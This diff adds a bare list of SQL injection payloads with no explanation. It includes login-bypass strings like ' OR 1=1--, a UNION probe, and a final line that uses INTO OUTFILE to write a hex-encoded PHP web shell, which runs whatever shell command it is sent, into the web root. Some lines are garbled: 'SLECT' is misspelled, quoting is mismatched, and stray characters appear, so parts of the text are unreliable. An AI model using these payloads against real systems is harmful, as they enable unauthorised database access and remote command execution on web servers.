@@ -1,0 +1,11 @@
+'+OR+1=1--
+
+=1' OR '1'='1
+ 
+=1' OR '1'='1'--+
+
+=1'+UNION+SLECT+1,2,3,4,5+FROM+TABLE    ?!?!?
+
+
+
+value' INTO OUTFILE '/var/www/html/shelll.php' LINES TERMINATED BY 'union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
